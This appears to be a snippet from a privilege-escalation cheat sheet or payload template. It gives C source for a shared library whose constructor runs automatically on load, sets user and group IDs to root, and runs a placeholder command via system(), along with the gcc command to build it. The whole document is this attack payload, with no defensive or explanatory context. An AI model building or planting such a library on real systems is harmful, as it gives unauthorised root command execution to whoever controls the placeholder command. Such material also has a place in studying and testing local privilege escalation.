# Shared Object File Source

The following `C` source code will run `$COMMAND`.

```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
	setuid(0);
	setgid(0);
    system("$COMMAND");
}
```

Compile the source with:

```bash
gcc -shared -fPIC source.c -o $OUTPUT_FILE
```
